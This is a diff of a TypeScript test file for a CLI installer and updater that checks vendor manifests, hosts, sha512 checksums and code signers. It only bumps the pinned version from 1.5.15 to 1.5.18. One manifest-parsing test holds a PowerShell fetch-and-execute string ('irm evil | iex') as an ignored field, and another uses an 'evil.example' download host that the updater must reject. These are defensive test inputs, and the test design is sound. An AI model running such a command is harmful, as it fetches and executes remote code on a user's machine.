@@ -40,19 +40,19 @@ function fake(options: { manifest?: string; manifestCode?: number | null; conten
 }
 const smallPin = { ...real, bytes: body153.length, sha512: sha(body153) };
 const deps = (over: Partial<InstallDeps> = {}): InstallDeps => ({ root: join(home, "cli"), nodePath: join(home, "nowhere", "node.exe"), pins: { antigravity: smallPin }, signerOf: async () => ({ status: "Valid", subject: GOOGLE }), ...over });
-/** The computer already has the pinned 1.5.15 (what an Install put there). */
+/** The computer already has the pinned 1.5.18 (what an Install put there). */
 async function withPinned(): Promise<void> {
   await installManagedCli("antigravity", deps({ run: fake({ content: body153 }).run }));
-  expect(managedCliExecutable(join(home, "cli"), "antigravity")).toMatchObject({ version: "1.5.15" });
+  expect(managedCliExecutable(join(home, "cli"), "antigravity")).toMatchObject({ version: "1.5.18" });
 }
 
 describe("what the vendor's manifest may say", () => {
   it("the real manifest (read 2026-11-10) is accepted, and gives the version, the address and the checksum, lower-cased", () => {
-    const text = JSON.stringify({ version: "1.5.15", url: real.url, sha512: real.sha512 });
-    expect(parseLatestManifest("antigravity", text)).toEqual({ version: "1.5.15", url: real.url, sha512: real.sha512 });
+    const text = JSON.stringify({ version: "1.5.18", url: real.url, sha512: real.sha512 });
+    expect(parseLatestManifest("antigravity", text)).toEqual({ version: "1.5.18", url: real.url, sha512: real.sha512 });
     expect(parseLatestManifest("antigravity", text.replace(real.sha512, real.sha512.toUpperCase()))?.sha512).toBe(real.sha512);
     // a field the vendor adds later is ignored, never used
-    expect(parseLatestManifest("antigravity", JSON.stringify({ version: "1.5.15", url: real.url, sha512: real.sha512, extra: "x", command: "irm evil | iex" }))).toEqual({ version: "1.5.15", url: real.url, sha512: real.sha512 });
+    expect(parseLatestManifest("antigravity", JSON.stringify({ version: "1.5.18", url: real.url, sha512: real.sha512, extra: "x", command: "irm evil | iex" }))).toEqual({ version: "1.5.18", url: real.url, sha512: real.sha512 });
   });
   it.each([
     ["another host", { url: "https://evil.example/antigravity-public/antigravity-cli/1.6.0-1/windows-x64/cli_windows_x64.exe" }],
@@ -88,7 +88,7 @@ describe("the table and the registry agree", () => {
 });
 
 describe("Update to the vendor's latest (the named exception)", () => {
-  it("reads the manifest from its fixed address, downloads that file, checks size, sha512 and the signer, and switches to it: 1.5.15 → 1.6.0, the old folder pruned", async () => {
+  it("reads the manifest from its fixed address, downloads that file, checks size, sha512 and the signer, and switches to it: 1.5.18 → 1.6.0, the old folder pruned", async () => {
     await withPinned();
     const { run, calls } = fake({ manifest: manifestOf("1.6.0", body16) }), steps: string[] = [];
     const result = await updateManagedCliToLatest("antigravity", deps({ run, report: s => steps.push(s) }));
@@ -102,7 +102,7 @@ describe("Update to the vendor's latest (the named exception)", () => {
     expect(steps).toEqual(expect.arrayContaining(["installing", "checking-integrity", "checking-publisher", "ready"]));
     expect(JSON.parse(readFileSync(join(home, "cli", "antigravity", "current.json"), "utf8"))).toEqual({ version: "1.6.0" });
     expect(readFileSync(join(home, "cli", "antigravity", "1.6.0", "agy.exe"))).toEqual(body16);
-    expect(existsSync(join(home, "cli", "antigravity", "1.5.15"))).toBe(false);
+    expect(existsSync(join(home, "cli", "antigravity", "1.5.18"))).toBe(false);
     // a copy NEWER than this Runtime's pin is the one in use
     expect(managedCliExecutable(join(home, "cli"), "antigravity")).toMatchObject({ version: "1.6.0", command: join(home, "cli", "antigravity", "1.6.0", "agy.exe") });
   });
@@ -117,7 +117,7 @@ describe("Update to the vendor's latest (the named exception)", () => {
     await withPinned();
     const { run } = fake({ manifest: manifestOf("1.6.0", body16), content: Buffer.from("MZ-something-else") });
     await expect(updateManagedCliToLatest("antigravity", deps({ run }))).rejects.toMatchObject({ reason: "integrity-mismatch", message: expect.stringContaining("checksum") });
-    expect(managedCliExecutable(join(home, "cli"), "antigravity")).toMatchObject({ version: "1.5.15" });
+    expect(managedCliExecutable(join(home, "cli"), "antigravity")).toMatchObject({ version: "1.5.18" });
     expect(existsSync(join(home, "cli", "antigravity", "1.6.0.staging"))).toBe(false);
     expect(existsSync(join(home, "cli", "antigravity", "1.6.0"))).toBe(false);
   });
@@ -127,14 +127,14 @@ describe("Update to the vendor's latest (the named exception)", () => {
       const { run } = fake({ manifest: manifestOf("1.6.0", body16) });
       await expect(updateManagedCliToLatest("antigravity", deps({ run, signerOf: async () => answer })), answer.status).rejects.toMatchObject({ reason: "publisher-mismatch" });
     }
-    expect(managedCliExecutable(join(home, "cli"), "antigravity")).toMatchObject({ version: "1.5.15" });
+    expect(managedCliExecutable(join(home, "cli"), "antigravity")).toMatchObject({ version: "1.5.18" });
     expect(existsSync(join(home, "cli", "antigravity", "1.6.0"))).toBe(false);
     expect(signerMatches(GOOGLE, real.native.signer)).toBe(true);
   });
   it("an empty file is refused (the manifest names no size, so there is a ceiling and a floor, not an exact size)", async () => {
     await withPinned();
     await expect(updateManagedCliToLatest("antigravity", deps({ run: fake({ manifest: manifestOf("1.6.0", Buffer.alloc(0)), content: Buffer.alloc(0) }).run }))).rejects.toMatchObject({ reason: "integrity-mismatch" });
-    expect(managedCliExecutable(join(home, "cli"), "antigravity")).toMatchObject({ version: "1.5.15" });
+    expect(managedCliExecutable(join(home, "cli"), "antigravity")).toMatchObject({ version: "1.5.18" });
   });
   it.each([
     ["the manifest could not be read", { manifest: "", manifestCode: 1 }, /could not be read/],
@@ -150,7 +150,7 @@ describe("Update to the vendor's latest (the named exception)", () => {
   it("a download that fails leaves the old copy and a clear message", async () => {
     await withPinned();
     await expect(updateManagedCliToLatest("antigravity", deps({ run: fake({ manifest: manifestOf("1.6.0", body16), downloadCode: 1 }).run }))).rejects.toMatchObject({ reason: "install-failed", message: expect.stringContaining("download could not be completed") });
-    expect(managedCliExecutable(join(home, "cli"), "antigravity")).toMatchObject({ version: "1.5.15" });
+    expect(managedCliExecutable(join(home, "cli"), "antigravity")).toMatchObject({ version: "1.5.18" });
   });
   it("the computer already has that release, or a newer one: nothing is downloaded and the copy stays", async () => {
     await withPinned();
